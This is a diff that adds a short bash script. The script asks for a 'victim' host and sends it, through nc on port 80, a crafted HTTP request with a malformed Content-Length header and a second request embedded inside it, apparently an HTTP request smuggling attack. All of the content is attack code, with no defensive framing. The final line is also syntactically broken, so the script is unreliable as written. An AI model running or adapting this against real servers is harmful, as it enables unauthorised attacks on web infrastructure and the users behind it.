@@ -1,0 +1,11 @@
+#!/bin/bash
+echo -ne "[+] Enter Victim: "
+read victim
+
+echo "GET / HTTP/1.1 
+Host: $victim
+Content-Length : 56GET / HTTP/1.1
+
+Host: $victim
+attack: 1
+foo:"; | nc $victim 80
